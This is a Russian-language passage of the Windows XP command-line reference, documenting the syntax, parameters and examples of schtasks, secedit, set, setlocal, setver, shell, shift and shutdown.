SchTasks.exe не предлагает ввести пароль, потому что для заданий, выполняющихся с разрешения системной учетной записи, не требуется пароль.

schtasks run

Немедленно запускает назначенное задание. Операция run игнорирует расписание, но использует путь к файлу программы, учетную запись пользователя и пароль, сохраненные в задании, чтобы немедленно запустить это задание.
Синтаксис

schtasks /run /tn имя_задания [/s компьютер [/u [домен\]пользователь /p пароль]] /?
Параметры

/tn имя_задания
    Идентифицирует задание. Параметр обязательный.
/s компьютер
    Задает имя или IP-адрес удаленного компьютера (с обратными косыми чертами или без них). По умолчанию используется локальный компьютер.
/u [домен\]пользователь
    Выполняет команду с разрешения указанной учетной записи пользователя. По умолчанию, команда запускается с разрешения пользователя, вошедшего в систему компьютера, на котором выполняется SchTasks.
/p пароль
    Задает пароль учетной записи пользователя, указанной параметром /u. Параметр требуется при использовании параметра /u.
/?
    Отображает справку в командной строке.

Примечания
- Используйте данную операцию, чтобы протестировать задания. Если задание не выполняется, проверьте журнал транзакций службы «Планировщик заданий»(системный_корневой_каталог\SchedLgU.txt) на наличие ошибок.- Выполнение задания не влияет на расписание задания и не меняет время следующего выполнения, назначенное для него.- Чтобы удаленно выполнить задание, оно должно быть назначено для удаленного компьютера. При запуске задания оно выполняется только на удаленном компьютере. Чтобы проверить выполнение задания на удаленном компьютере, используйте диспетчер задач или журнал транзакций службы «Планировщик заданий» (системный_корневой_каталог\SchedLgU.txt).
Примеры
Чтобы выполнить задание на локальном компьютере

Следующая команда запускает задание «Сценарий безопасности».

schtasks /run /tn "Сценарий безопасности"

В ответ, программа SchTasks.exe запускает сценарий задания и выводит на экран следующее сообщение:

УДАЧА. Запланированная задача "Сценарий безопасности" выполняется.

Чтобы выполнить задание на удаленном компьютере

Данная команда запускает задание «Update» на удаленном компьютере «Srv01»:

schtasks /run /tn Update /s Svr01

В этом случае программа SchTasks.exe выводит следующее сообщение об ошибке:

ОШИБКА. Не удается выполнить запланированную задачу "Update".

Чтобы выяснить причину ошибки, посмотрите журнал транзакций назначенных заданий (C:\Windows\SchedLgU.txt) на компьютере «Svr01». В журнале появилась запись:


"Update.job" (update.exe) 3/26/2001 1:15:46 PM ** ОШИБКА **
Попытка использования учетной записи задания окончилась неудачей, поэтому задание выполнено не было.
    Специфическая ошибка:
    0x8007052e: Отказ входа в систему: Причина: неизвестное имя пользователя или неверный пароль.
    Проверьте правильность указания имени пользователя и пароля и повторите попытку.

Имя пользователя или пароль являются недопустимыми для системы. Следующая команда schtasks /change обновляет имя пользователя и пароль для задания «Update» на компьютере Srv01.

schtasks /change /tn Update /s Svr01 /ru Administrator /rp PassW@rd3

После завершения команды change, повторяется команда run. Сейчас запускает программу Update.exe и SchTasks.exe выводит сообщение:

УДАЧА. Запланированная задача "Update" выполняется.

schtasks end

Останавливает программу, запущенную заданием.
Синтаксис

schtasks /end /tn имя_задания [/s компьютер [/u [домен\]пользователь /p пароль]] /?
Параметры

/tn имя_задания
    Идентифицирует задание, запускающее программу. Параметр обязательный.
/s компьютер
    Задает имя или IP-адрес удаленного компьютера (с обратными косыми чертами или без них). По умолчанию используется локальный компьютер.
/u [домен\]пользователь
    Выполняет команду с разрешения указанной учетной записи пользователя. По умолчанию, команда запускается с разрешения пользователя, вошедшего в систему компьютера, на котором выполняется SchTasks.
/p пароль
    Задает пароль учетной записи пользователя, указанной параметром /u. Параметр требуется при использовании параметра /u.
/?
    Вывод справки.

Примечания
- SchTasks.exe завершает только элементы программы, запущенной с помощью назначенного задания. Чтобы остановить другие процессы, используйте средство «TaskKill», включенное в систему Windows XP Professional. Дополнительные сведения о средстве «TaskKill» содержатся в разделе TaskKill..
Примеры
Чтобы завершить задание на локальном компьютере

Следующая команда останавливает экземпляр Notepad.exe, который был запущен заданием «Мой блокнот».

schtasks /end /tn "Мой блокнот"

В ответ, программа SchTasks.exe останавливает запущенный экземпляр Notepad.exe и выводит следующее сообщение об удачной операции.

УДАЧА. Запланированная задача "Мой блокнот" была успешно снята.

Чтобы завершить задание на удаленном компьютере

Следующая команда завершает экземпляр Internet Explorer, который был запущен заданием «InternetOn» на удаленном компьютере «Svr01».

schtasks /end /tn InternetOn /s Svr01

В ответ, программа SchTasks.exe останавливает запущенный экземпляр Internet Explorer и выводит следующее сообщение об удачной операции.

УДАЧА. Запланированная задача "InternetOn" была успешно снята.

schtasks delete

Удаляет назначенное задание
Синтаксис

schtasks /delete /tn {имя_задания | *} [/f] [/s компьютер [/u [домен\]пользователь /p пароль]] [/?]
Параметры

/tn {имя_задания | *}
    Идентифицирует удаляемое задание. Параметр обязательный.
Значение     Описание
имя_задания     Удаляет данное задание.
*     Удаляет все задания, назначенные на компьютере.
/f
    Отменяет вывод сообщения об уведомлении. Задание удаляется без предупреждения.
/s компьютер
    Задает имя или IP-адрес удаленного компьютера (с обратными косыми чертами или без них). По умолчанию используется локальный компьютер.
/u [домен\]пользователь
    Выполняет команду с разрешения указанной учетной записи пользователя. По умолчанию команда запускается с разрешения пользователя, вошедшего в систему компьютера, на котором выполняется SchTasks.
/p пароль
    Задает пароль учетной записи пользователя, указанной параметром /u. Параметр требуется при использовании параметра /u.
/?
    Отображает справку в командной строке.

Примечания
- Операция delete удаляет задание из расписания. При этом не удаляется программа, которую выполняет или прерывает задание.- Команда delete.* удаляет все задания, назначенные для компьютера, а не только задания, назначенные текущим пользователем.
Примеры
Чтобы удалить задание из расписания удаленного компьютера

Следующая команда удаляет задание «Start Mail» из расписания удаленного компьютера. Параметр /s используется в программе для указания удаленного компьютера.

schtasks /delete /tn "Start Mail" /s Svr16

В ответ, программа SchTasks.exe выводит на экран следующее сообщение о подтверждении. Чтобы удалить задание, введите y. Для отмены команды введите n.

ПРЕДУПРЕЖДЕНИЕ: Хотите удалить задание «Start Mail» (Д/Н )? д
УДАЧА. Запланированная задача "Start Mail" была успешно удалена.

Чтобы удалить все задания, назначенные для локального компьютера

Следующая команда удаляет все задания из расписания локального компьютера, включая задания, назначенные другими пользователями. Параметр /tn * в команде представляет все задания на компьютере, а параметр /f отменяет вывод сообщения о подтверждении.

schtasks /delete /tn * /f

В ответ на эту команду, программа SchTasks.exe выводит следующее сообщение, показывающее, что только назначенное задание «SecureScript» удалено.
УДАЧА. Запланированная задача "SecureScript" была успешно удалена.

schtasks query

Выводит на экран все задания, назначенные для выполнения на компьютере, включая задание, назначенные другими пользователями.
Синтаксис

schtasks [/query] [/fo {TABLE | LIST | CSV}] [/nh] [/v] [/s компьютер [/u [домен\]пользователь /p пароль]]
Параметры

[/query]
    Имя запроса является необязательным. При вводе команды schtasks без параметров выполняется запрос.
/fo {TABLE|LIST|CSV}
    Задает выходной формат. Выходной формат по умолчанию — TABLE.
/nh
    Опускает заголовки столбцов при отображении таблицы. Параметр является допустимым с выходными форматами TABLE и CSV.
/v
    К выведенным заданиям добавляет их дополнительные свойства.

Запросы, в которых используется параметр /v должны иметь выходной формат LIST или CSV.
/s компьютер
    Задает имя или IP-адрес удаленного компьютера (с обратными косыми чертами или без них). По умолчанию используется локальный компьютер.
/u [домен\]пользователь
    Выполняет команду с разрешения указанной учетной записи пользователя. По умолчанию, команда запускается с разрешения пользователя, вошедшего в систему компьютера, на котором выполняется SchTasks.
/p пароль
    Задает пароль учетной записи пользователя, указанной параметром /u. Параметр требуется при использовании параметра /u.
/?
    Отображает справку в командной строке.

Примечания
- Операция query выводит список всех заданий, назначенных для компьютера, а не только заданий, назначенных текущим пользователем.
Примеры
Чтобы отобразить назначенные задания на локальном компьютере

Следующие команды выводят на экран все задания, назначенные для локального компьютера. Эти команды приводят к одному результату. Их можно использовать без изменений.

schtasks

schtasks /query

В ответ на команду, программа SchTasks.exe по умолчанию выводит задания в формате таблицы, например:


Имя задания Следующий запуск Состояние
========================= ======================== ==============
Microsoft Outlook При запуске
SecureScript 14:42:00 PM , 2/4/2001

Чтобы вывести на экран дополнительные свойства назначенных заданий

Следующая команда запрашивает вывод подробных сведений о заданиях на локальном компьютере. Параметр /v используется в команде для запроса подробного вывода, а параметр /fo LIST — для форматирования вывода в список для облегчения процесса чтения. Используйте эту команду, чтобы проверить, что созданное задание имеет

schtasks /query /fo LIST /v

В ответ на эту команду, программа SchTasks.exe выводит на экран подробный список свойств для всех заданий. Далее показан список для задания, запланированного для выполнения в 4:00 в последнюю пятницу каждого месяца:


Имя узла: RESKIT01
Имя задачи: SecureScript
Следующий запуск: 4:00:00 AM , 3/30/2001
Состояние: Не выполняется
Последний запуск: Нет
Последний результат: 0
Создан: user01
Расписание: В 4:00 AM в последнюю пт каждого месяца, начиная с 3/24/2001
Задача для выполнения: C:\WINDOWS\system32\notepad.exe
Рабочая папка: notepad.exe
Комментарий: Н/Д
Состояние назначенной задачи: Включено
Тип разписания: Ежемесячно
Модификатор: последняя пятница
Время запуска: 4:00:00 AM
Дата начала: 3/24/2001
Дата окончания: Н/Д
Дн.: пятница
Мес.: янв,фев,мар,апр,май,июн,июл,авг,сен,окт,ноя,дек
Запуск от имени: RESKIT\user01
Удалить задачу, если она не перенесена: Отключено
Остановить задачу, если она выполняется Х ч. и Х мин.: 72:00
Повторять: до: время: Отключено
Повторять: в течение: длительность: Отключено
Повторять: остановить, если выполняется Отключено
При простое: Время начала (для типа расписания ПРИ ПРОСТОЕ) Отключено
При простое: Запускать только при простое в Х мин. Отключено
При простое: Без простоя повторять попытки в течение Х мин. Отключено
При простое: Остановить задачу по завершении простоя Отключено
Управление электропитанием: Не запускать при питании от батареи Отключено
Управление электропитанием: Останавливать при питании от батареи Отключено

Чтобы просмотреть задания, назначенные для удаленного компьютера

Следующая команда запрашивает список заданий, назначенных для удаленного компьютера, и добавляет задания в файл журнала в формате с разделителями — запятыми на локальном компьютере. Чтобы собрать и отслеживать задания, назначенные нескольким компьютерам, используйте данный формат команды.

Параметр /s идентифицирует уделенный компьютер «Reskit16», параметр /fo задает формат, а параметр /nh отменяет вывод заголовков столбцов. Символ добавления >> перенаправляет вывод в журнал заданий p0102.csv на локальный компьютер «Srv01». Путь к локальному компьютеру должен быть задан полностью, потому что команда выполняется на удаленном компьютере.

schtasks /query /s Reskit16 /fo csv /nh >> \\svr01\data\tasklogs\p0102.csv

В ответ на команду, программа SchTasks.exe добавляет задания, назначенные для удаленного компьютера, в файл p0102.csv на локальном компьютере Srv01.
Примечания
- SchTasks.exe выполняет операции, похожие на операции средства «Назначенные задания» в панели управления. Это средство также используется для создания, удаления, настройки и вывода назначенных заданий.- При вводе команды schtasks без параметров выполняется запрос.- Пользователь должен быть членом группы «Администраторы» на компьютере, на котором команда выполняется.- Для проверки выполнения или выяснения причины невыполнения назначенного задания см. журнал транзакций службы планировщика заданий (системный_корневой_каталог\SchedLgU.txt).- В редких случаях файлы заданий повреждаются. Поврежденные задания не выполняются. При попытке выполнить операцию поврежденного задания, SchTasks.exe выводит следующее сообщение об ошибке:

ОШИБКА. Недопустимые данные.

Восстановить поврежденные задания нельзя. Чтобы восстановить системные параметры назначения заданий, удалите задания из системы с помощью SchTasks.exe или средства «Назначенные задания» и повторно запланируйте их.
- SchTasks.exe заменяет средство At.exe, включенное в предыдущие версии Windows. ========================================================================================
Secedit

Настраивает и анализирует безопасность системы, сравнивая текущую конфигурацию хотя бы с одним шаблоном.

Чтобы посмотреть синтаксис команды, щелкните команду:

secedit /analyze
Синтаксис

secedit /analyze /db имя_файла [/cfg имя_файла] [/log имя_файла] [/quiet]
Параметры

/db имя_файла
    Обязательный параметр. Указывает путь к базе и имя файла базы, содержащей сохраненную конфигурацию, по которой будет производиться анализ. Если значение имя_файла соответствует новой базе, необходимо указать параметр командной строки /cfg имя_файла.
/cfg имя_файла
    Определяет путь к шаблону безопасности и имя файла шаблона, который будет импортироваться в базу данных для анализа. Данный параметр командной строки может использоваться только вместе с параметром /db. Если параметр не указан, анализ выполняется по конфигурации, хранящейся в базе данных.
/log имя_файла
    Отображает имя и путь файла журнала для анализа. Если данный параметр не указан, используется файл журнала по умолчанию.
/quiet
    Предотвращает вывод на экран и в файл журнала. Имеется возможность посмотреть результаты анализа, используя оснастку «Анализ и настройка безопасности».

secedit /configure

Служит для настройки безопасности системы с использованием сохраненного шаблона.
Синтаксис

secedit /configure /db имя_файла [/cfg имя_файла ] [/overwrite][/areas область1 область2...] [/log имя_файла] [/quiet]
Параметры

/db имя_файла
    Обязательный параметр. Представляет имя файла базы данных, содержащей применяемый шаблон безопасности.
/cfg имя_файла
    Имя файла шаблона безопасности, который будет импортироваться в базу данных и применяться при настройке безопасности. Данный параметр командной строки может использоваться только вместе с параметром /db. Если данный параметр не указан, будет использоваться шаблон, хранящийся в базе данных.
/overwrite
    Cледует указывать в том случае, если шаблон безопасности, указанный в параметре /cfg, должен замещать любой шаблон или составной шаблон, хранящийся в базе данных, вместо того, чтобы добавлять результаты в хранящуюся базу данных. Данный параметр командной строки может использоваться только вместе с параметром /cfg. Если параметр не указан, шаблон, указанный в аргументе /cfg, будет добавлен в шаблон, хранящийся в базе данных.
/areas область1 область2...
    Определяет области безопасности, которые следует применить в системе. Если область не указана, в системе применяются все области. Имена областей должны разделяться пробелами.
    Имя области     Описание
    SECURITYPOLICY     Локальная политика и политика для домена, включая политики учетных записей, политики аудита и т. п.
    GROUP_MGMT     Настройка ограничений для всех групп, указанных в шаблоне безопасности
    USER_RIGHTS     Права пользователей на вход в систему и предоставление привилегий
    REGKEYS     Безопасность разделов локального реестра
    FILESTORE     Безопасность локальных устройств хранения файлов
    SERVICES     Безопасность для всех определенных служб
/log имя_файла
    Отображает имя и путь файла журнала для анализа. Если путь не задан, используется путь по умолчанию.
/quiet
    Предотвращает вывод на экран и в файл журнала.

secedit /export

Служит для экспорта сохраненного шаблона из базы данных безопасности в файл шаблона безопасности.
Синтаксис

secedit /export [/mergedpolicy] [/DB имя_файла] [/CFG имя_файла] [/areas область1 область2...] [/log имя_файла] [/quiet]
Параметры

/mergedpolicy
    Объединяет и экспортирует настройку безопасности локальной политики и настройку политики домена.
/db имя_файла
    Указывает файл базы данных, содержащий экспортируемый шаблон. Если база данных не указана, используется база данных системной политики.
/db имя_файла
    Определяет имя файла, где должен быть сохранен шаблон.
/areas область1 область2...
    Задает области безопасности, которые следует экспортировать в шаблон. При неуказанной области экспортируются все области. Имена областей должны разделяться пробелами.
    Имя области     Описание
    SECURITYPOLICY     Определяет локальную политику и политику для домена, включая политики учетных записей, политики аудита и т. п.
    GROUP_MGMT     Задает настройку ограничений для всех групп, указанных в шаблоне безопасности
    USER_RIGHTS     Указывает права пользователей на вход в систему и предоставляет привилегии
    REGKEYS     Определяет безопасность раздела локального реестра
    FILESTORE     Определяет безопасность локальных устройств хранения файлов
    SERVICES     Задает безопасность для всех определенных служб
/log имя_файла
    Отображает имя и путь файла журнала для анализа. Если путь не задан, используется путь по умолчанию.
/quiet
    Предотвращает вывод на экран и в файл журнала.

secedit /validate

Служит для проверки синтаксиса шаблона безопасности при его импорте в базу данных или применении к системе.
Синтаксис

secedit /validate имя_файла
Параметр

имя_файла
    Указывает имя файла шаблона безопасности, который был создан с помощью средства «Шаблоны безопасности».

Примечания
- Команда secedit /refreshpolicy была заменена командой gpupdate. Сведения об обновлении параметров безопасности см. в разделе о средстве gpupdate. 
========================================================================================
Set

Устанавливает, удаляет и просматривает переменные среды. Вызванная без параметров, команда set выводит список установленных переменных среды и их значений.
Синтаксис

set [[/a [выражение]] [/p [переменная=]] строка]
Параметры

/a
    Указывает, что параметр строка является вычисляемым числовым выражением.
/p
    Задает значение переменной строкой ввода.
переменная
    Указывает имя переменной, значение которой требуется задать или изменить.
строка
    Задает строковое значение для указанной переменной.
/?
    Отображает справку в командной строке.

Примечания
- Использование команды set в консоли восстановления

Команда set с другими параметрами доступна в консоли восстановления.
- Использование специальных символов

Символы <, >, |, &, ^ являются специальными символами командной оболочки, необходимо либо ставить перед ними управляющий символ (^), либо заключать в кавычки, при использовании символов в параметре строка (например, "строка_содержания&символ"). При заключении в кавычки строки, содержащей специальные символы, кавычки считаются частью значения переменной среды.
- Использование переменных среды

Переменные среды используются для управления работой некоторых пакетных файлов и программ и для управления работой Windows XP и подсистемы MS-DOS. Команда set часто используется в файле Autoexec.nt для установки переменных среды.
- Вывод текущих установок среды

Когда команда set вызвана без параметров, на экран будут выведены текущие установки. Обычно эти установки включают переменные COMSPEC и PATH, используемые для поиска программ на диске. Две другие переменные среды, используемые Windows XP — это PROMPT и DIRCMD.
- Использование параметров

При указании значений для переменной и строки значение переменной добавляется к окружению, а строка ставится в соответствие этой переменной. Если переменная уже существует, новое значение замещает старое значение.

Если в команде set указано только имя переменной и знак равенства (без значения), какое-либо значение больше не будет ставиться в соответствие переменной среды, что эквивалентно удалению переменной среды.
- Использование /a

В следующей таблице представлены операторы, поддерживающие параметр /a, в порядке убывания очередности.
Оператор     Выполнение оператора
< >     Группировка
* / % + -     Арифметические действия
<< >>     Логический перенос
&     Поразрядное И
^     Поразрядное исключающее ИЛИ
|     Поразрядное ИЛИ
= *= /= %= += -= &= ^= |= <<= >>=     Назначение
,     Разделитель выражения

При использовании логических операторов (&& ||) или оператора остатка от деления (%) заключайте выражение строки в кавычки. Любые нечисловые строки в выражении считаются именами переменной среды, чьи значения преобразованы в числа до обработки. Если указано имя переменной среды, которое не определено в текущем окружении, ей присваивается значение нуля, что позволяет выполнять арифметические операции со значениями переменной среды без использования % для получения значения.

При выполнении команды set /a из командной строки вне командного сценария, выводится конечное значение выражения.

Численные значения — это десятичные числа, кроме чисел с префиксами 0? для шестнадцатеричных чисел и 0 для восьмеричных чисел. Таким образом, 0?12 тоже самое, что 18 и 022. Восьмеричное представление можно спутать. Например, 08 и 09 недопустимы, потому что 8 и 9 не являются восьмеричными цифрами.
- Использование /p

Используется, когда не требуется включать командную строку.
- Поддержка расширения переменной среды с задержкой

Добавлена поддержка расширения переменной среды с задержкой. Эта поддержка отключена по умолчанию, можно включить или отключить ее с помощью команды cmd /v.
- Работа с расширениями команды

При включенных расширениях команды (установлено по умолчанию) и выполнении команды set без значений, на экран выводятся все текущие переменные среды. Если же выполняется команда set со значением, отображаются переменные, соответствующие этому значению.
- Использование команды set в пакетных файлах

При создании пакетных файлов, используйте команду set для создания переменных и использовании их в качестве числовых переменных от %0 до %9. Также можно использовать переменные от %0 до %9 как ввод для команды set.
- Обращение к переменным команды set из пакетных программ

При обращении к переменной из пакетной программы имя переменной должно быть заключено в знаки процентов (%). Например, если в пакетной программе создается переменная BAUD, с ней может быть связан заменяемый параметр путем использования имени %baud% в командной строке.
Примеры

Чтобы задать переменную среды с именем TEST^1, введите команду:

set testVar=test^^1

Чтобы задать переменную среды с именем TEST&1, введите команду:

set testVar=test^&1

Значением переменной команды set определяет все, что следует за знаком равенства (=). При вводе:

set testVar="test^1"
Результат будет следующим:

testVar="test^1"

Для установки переменной среды INCLUDE так, чтобы с ней была связана строка C:\Inc (каталог Inc на диске C), можно использовать следующую команду:

set include=c:\inc

Строку C:\Inc можно использовать в пакетных файлах, заключив имя INCLUDE в знаки процента (%). Например, в пакетном файле можно использовать следующую команду для вывода содержимого каталога, на который указывает переменная среды INCLUDE:

dir %include%

При выполнении команды строка %include% будет заменена строкой C:\Inc.

Можно также использовать команду set в пакетной программе, которая добавляет новый каталог к переменной среды PATH. Например:

@echo off
rem ADDPATH.BAT добавляет новый каталог
rem к переменной среды path.
set path=%1;%path%
set

При включенных расширениях команды (установлено по умолчанию) и выполнении команды set со значением, на экран выводятся все переменные среды, соответствующие значению. Например, при вводе в командную строку : set p, результат будет следующим:

Path=C:\WINNT\system32;C:\WINNT;C:\WINNT\System32\Wbem
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH
PROCESSOR_ARCHITECTURE=x86
PROCESSOR_IDENTIFIER=x86 Family 6 Model 8 Stepping 1, GenuineIntel
PROCESSOR_LEVEL=6
PROCESSOR_REVISION=0801
ProgramFiles=C:\Program Files
PROMPT=$P$G
========================================================================================
Setlocal

Начало области задания для определения переменных среды в пакетном файле. Локальное окружение используется до тех пор, пока не встретится команда endlocal или не будет достигнут конец пакетного файла.
Синтаксис

setlocal {enableextension | disableextensions} {enabledelayedexpansion | disabledelayedexpansion}
Аргументы

enableextension
    Включает расширения командного процессора до появления соответствующей команды endlocal, вне зависимости от состояния расширений командного процессора перед командой setlocal. 
disableextensions
    Выключает расширения командного процессора до появления соответствующей команды endlocal, вне зависимости от состояния расширений командного процессора перед командой setlocal.
enabledelayedexpansion
    Включает расширения переменной среды с задержкой до появления соответствующей команды endlocal, вне зависимости от состояния расширений командного процессора перед командой setlocal.
disabledelayedexpansion
    Выключает расширения переменных среды с задержкой до появления соответствующей команды endlocal, вне зависимости от состояния расширений командного процессора перед командой setlocal.
/?
    Отображает справку в командной строке.

Примечания
- Использование команды setlocal

Команда setlocal не выполняется при использовании вне сценария или пакетного файла.
- Изменение переменных среды

Используйте команду setlocal для изменения переменных среды при выполнении пакетного файла. Изменения среды, выполненные после setlocal, являются локальными для пакетного файла. Cmd.exe восстанавливает первоначальные параметры при обнаружении команды endlocal или достижении конца пакетного файла.
- Допускается использование нескольких команд setlocal и endlocal в пакетной программе (так называемых, вложенных команд). - Проверка расширений командного процессора в пакетных файлах

Команда setlocal устанавливает переменную ERRORLEVEL. При выполнении аргументов {enableextension | disableextensions} или {enabledelayedexpansion | disabledelayedexpansion} переменная ERRORLEVEL имеет значение ноль (0). В противном случае ее значение — 1. Этим можно воспользоваться в пакетных программах для проверки доступности расширений командного процессора, например:

 verify other 2>nul
 setlocal enableextensions
 if errorlevel 1 echo Включение расширений командного процессора невозможно

Так как команда cmd не устанавливает значение переменной ERRORLEVEL, когда расширения командного процессора отключены, команда verify устанавливает переменную ERRORLEVEL в ненулевое значение при использовании этой команды с недопустимым аргументом. Если используется команда setlocal с аргументами {enableextension | disableextensions} или {enabledelayedexpansion | disabledelayedexpansion} и значение переменной ERRORLEVEL не 1, расширения командного процессора недоступны.

Дополнительные сведения о расширениях командного процессора см. в разделе cmd, доступном по ссылке «».
Примеры

Локальное изменение переменных среды в пакетном файле может быть использовано следующим образом:

 rem *******Начало комментария**************
 rem Эта программа запускает приложение superapp в сети,
 rem записывает вывод в файл и загружает этот файл в программу
 rem Блокнот.
 rem *******Конец комментария **************
 @echo off
 setlocal
 path=g:\programs\superapp;%path%
 call superapp>c:\superapp.out
 endlocal
 start notepad c:\superapp.out

========================================================================================
Setver

Устанавливает номер версии MS-DOS, который подсистема MS-DOS сообщает программам. Использованная без параметров, команда setver выводит таблицу текущих версий.
Синтаксис

setver [диск:путь] [имя_файла n.nn]

setver [диск:путь] [имя_файла [/delete [/quiet]]

Для вывода сведений о текущих назначениях версий используется следующий формат:

setver [диск:путь]
Параметры

[диск:путь
    Указывает путь к файлу Setver.exe.
имя_файла
    Задает имя файла программы (.exe или .com), которое будет добавлено к таблице назначения версий. Использование подстановочных знаков (* и ?) не допускается.
n.nn
    Задает версию MS-DOS (например, 3.3 или 4.01), которую подсистема MS-DOS сообщает заданной программе.
/delete
    Удаляет сведения о данной программе из таблицы назначения версий. Так же можно использовать параметр /d.
/quiet
    Скрывает сообщение, которое обычно выводится при удалении записи из таблицы назначения версий.
/?
    Отображает справку в командной строке.

Примечания
- Использование таблицы назначения версий

Многие программы, которые были разработаны для использования с предыдущими версиями MS-DOS, будут корректно работать с системой Windows XP. Однако, в некоторых случаях, программа может не работать до тех пор, пока ее имя не будет включено в таблицу назначения версий. Эта таблица сообщает программе, что она работает с той версией MS-DOS, для которой она была разработана, несмотря на то что она в действительности работает с подсистемой MS-DOS. Воспринимая версию MS-DOS 5.0 как более старую, программа может работать корректно. Однако, использование команды setver не решит проблему с теми программами, которые несовместимы с системой Windows XP.
- Загрузка таблицы назначения версий в память

Перед использованием команды setver таблица назначений версий должна быть загружена в память с помощью команды device в файле Config.nt.
- Обновление таблицы назначения версий

После обновления таблицы назначения версий (добавления или удаления записей) должен быть запущен новый экземпляр интерпретатора командной строки для считывания обновленной таблицы назначения версий.
- Обновление существующих записей

Если задано имя файла, который уже находится в таблице назначения версий, новая запись заменит старую.
- Коды завершения команды setver

Чтобы проанализировать в пакетной программе коды завершения, выведенные командой setver, используйте параметр уровень_ошибки в командной строке if. Чтобы увидеть пример пакетной программы, обрабатывающей коды завершения с помощью if, щелкните ссылку «». В следующей таблице перечислены коды завершения с кратким описанием.
Код завершения     Описание
0     Программа setver успешно закончила работу
1     Задан неверный ключ командной строки
2     Задано неверное имя файла
3     Недостаточно системной памяти для работы команды
4     Задан недопустимый формат номера версии
5     Программа setver не может найти заданную запись в таблице назначения версий
6     Программа setver не может найти файл Setver.exe
7     Задан недопустимый диск
8     Задано слишком много параметров команды
9     Отсутствует параметр команды setver
10     Программа setver обнаружила ошибку при чтении файла Setver.exe
11     Файл Setver.exe поврежден
12     Заданный файл Setver.exe не поддерживает таблицу назначения версий
13     В таблице назначения версий недостаточно места для новой записи
14     Программа setver обнаружила ошибку при записи в файл Setver.exe
Примеры

Для запуска Myprog.exe, файла, который выполняется с MS-DOS версии 3.30, создайте запись в таблице назначения версий, в результате чего, Myprog.exe интерпретирует подсистему MS-DOS, как версию 3.30, вводом следующей команды:

setver myprog.exe 3.30

Для удаления записи о программе Myprog.exe из таблицы назначения версий служит следующая команда:

setver myprog.exe /delete

Для просмотра содержимого таблицы назначения версий на диске C служит следующая команда:

setver c:
========================================================================================
Shell

Указывает имя и местоположение альтернативного командного интерпретатора, которого использует Windows XP для подсистемы MS-DOS.
Синтаксис

shell=[[диск:]путь] имя_файла [параметры]
Параметры

[[диск:][путь] имя_файла
    Задает местоположение и имя командного интерпретатора.
параметры
    Задает параметры и ключи командной строки для использования при запуске заданного командного интерпретатора.
/?
    Отображает справку в командной строке.

Примечания
- Параметры по умолчанию

По умолчанию, подсистема MS-DOS использует специальную версию интерпретатора Command.com, которая работает так же, как и другие подсистемы Windows XP, (включая каналы и перенаправления между системами) и команда shell не является необходимой.
- Задание 16-разрядного командного интерпретатора

Хотя это и не рекомендуется, команда shell может задавать альтернативный 16-разрядный командный интерпретатор.
- Использование параметров командной строки с командным интерпретатором

Команда shell сама по себе не использует параметры командной строки, но если они нужны командному интерпретатору, параметры могут быть заданы в команде shell.
Примеры

Предположим, что файл Newshell.com, находящийся в каталоге /Bin на загрузочном диске, должен быть использован как альтернативный командный интерпретатор. Для этого в файл Config.nt должна быть вставлена следующая команда:

shell=\bin\newshell.com
========================================================================================
Shift

Изменяет положения пакетных параметров в пакетных файлах.
Синтаксис

shift
Параметры

отсутствуют

Примечания
- Использование параметра командной строки shift с расширениями командного процессора

Если расширения командного процессора разрешены (используются по умолчанию), команда shift поддерживает ключ /n, который указывает команде начинать сдвиг с n-го аргумента, где n — число от нуля до восьми. Например:

SHIFT /2

сдвинет %3 на %2, %4 на %3 и т. д. %0 и %1 останутся неизменными.
- Работа команды shift

Команда shift изменяет значения замещаемых параметров %0 - %9 путем копирования каждого параметра в предыдущий. Другими словами, значение %1 копируется в %0, значение %2 — в %1 и т. д. Такой прием оказывается полезным при написании пакетных файлов, выполняющих одну и ту же операцию над любым числом параметров.
- Работа более чем с 10 пакетными параметрами

Команда shift также может быть использована для создания пакетных программ, воспринимающих более 10 параметров. В командной строке такой программы можно задать более 10-ти параметров, при этом все параметры, следующие за десятым (то есть за переменной%9) будут последовательно помещены в эту переменную %9.
- Использование %* с командой shift

Команда shift не влияет на пакетный параметр %*.
- Смещение параметров в обратном направлении

Команды, выполняющей обратный сдвиг не существует. После сдвига параметров командой shift начальное значение первого параметра (%0) не может быть восстановлено.
Примеры

В следующем пакетном файле Mycopy.bat показано, как использовать команду shift с произвольным числом пакетных параметров. Файл копирует набор файлов в заданный каталог. Пакетные параметры представлены аргументами имени файла и каталога.


@echo off
rem MYCOPY.BAT копирует произвольное число файлов
rem в каталог.
rem Используется следующий синтаксис:
rem mycopy dir файл1 файл2 ... 
set todir=%1
:getfile
shift
if "%1"=="" goto end
copy %1 %todir%
goto getfile
:end
set todir=
echo Работа закончена

========================================================================================
Shutdown

Позволяет выключать или перезапускать локальный или удаленный компьютер. Использование без параметров команды shutdown приведет к выходу из системы текущего пользователя.
Синтаксис

shutdown [{-l|-s|-r|-a}] [-f] [-m [\\имя_компьютера]] [-t xx] [-c "сообщение"] [-d[u][p]:xx:yy]
Параметры

-l
    Осуществляет выход текущего пользователя из системы (также используется по умолчанию). -m имя_компьютера имеет приоритет.
-s
    Выключает локальный компьютер.
-r
    Выполняет перезагрузку после выключения.
-a
    Прерывает выключение. Игнорируются все параметры, кроме -l и имя_компьютера. Параметр -a можно использовать только в течение интервала таймаута.
-f
    Принудительно закрывает выполняющиеся приложения.
-m [\\имя_компьютера]
    Указывает компьютер, который требуется выключить.
-t xx
    Устанавливает таймер завершения работы системы на xx секунд. По умолчанию это время составляет 20 секунд.
-c "сообщение"
    Задает сообщение, выводящееся в области «Сообщение» в окне «Завершение работы системы». Можно использовать до 127 знаков. Текст сообщения должен быть заключен в прямые кавычки.
-d [u][p]:xx:yy
    Отображает перечень кодов причины выключения. В следующей таблице перечислены различные значения.
    Значение     Описание
    u     Указывает код пользователя
    p     Указывает код планового выключения
    xx     Указывает основной код причины (0-255)
    yy     Указывает вспомогательный код причины (0-65536)
/?
    Отображает справку в командной строке.

Примечания
-Если указывается основной и вспомогательный коды причины, необходимо предварительно определить эти коды на каждом компьютере, на котором планируется использовать конкретный код. Если коды причины не определены на конечном компьютере, программа «Просмотр событий» не сможет занести в журнал правильный текст причины.
Примеры

Чтобы выключить сервер \\MyServer через 60 секунд, принудительно закрыть выполняющиеся приложения, перезагрузить компьютер после выключения, указать код пользователя, указать что выключение является плановым, занести в журнал основной код причины 125 и вспомогательный код причины 1, введите:

shutdown -r -f -m \\MyServer -t 60 -d up:125:1
========================================================================================
Sort

